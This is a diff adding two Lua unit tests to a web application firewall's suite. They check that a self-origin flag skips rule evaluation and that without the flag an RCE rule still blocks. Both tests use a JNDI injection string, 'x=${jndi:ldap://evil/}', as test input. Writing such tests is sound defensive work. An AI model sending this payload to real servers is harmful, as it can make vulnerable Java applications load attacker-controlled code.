@@ -849,6 +849,39 @@ do
   check(hit == false, "54: B1 smuggling_cl — well-formed CL, no hit")
 end
 
+-- ── Test 54z: ctx.self_origin short-circuits the WAF before any rule runs ──
+-- cfm.lua computes self_origin via is_self_origin(ip) and passes it into
+-- waf.check(). Even with rules that would otherwise fire on a payload,
+-- self-origin must return (false, nil, nil, nil) immediately — defence in
+-- depth against any caller that bypasses cfm.lua's Step 0a hard bypass.
+do
+  disable_all_rules()
+  -- Block-class rule that would normally fire on a JNDI payload.
+  waf.set_rule("rule_rce", "block")
+
+  local hit, reason, ttl, action = waf.check(fresh_ctx({
+    args        = "x=${jndi:ldap://evil/}",
+    self_origin = true,
+  }))
+  check(hit == false,   "54z: self_origin — hit=false despite RCE payload")
+  check(reason == nil,  "54z: self_origin — reason nil")
+  check(ttl == nil,     "54z: self_origin — ttl nil")
+  check(action == nil,  "54z: self_origin — action nil")
+end
+
+-- ── Test 54z2: ctx.self_origin=false does not bypass ─────────────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_rce", "block")
+
+  local hit, _reason, _ttl, action = waf.check(fresh_ctx({
+    args        = "x=${jndi:ldap://evil/}",
+    self_origin = false,
+  }))
+  check(hit == true,        "54z2: self_origin=false — RCE still fires")
+  check(action == "block",  "54z2: self_origin=false — action=block")
+end
+
 -- ── Test 54a: detect_traversal — signal-based matching (rule 101) ───────────
 -- The detector fires only on strong-signal traversal:
 --   * null bytes (raw or percent-encoded)
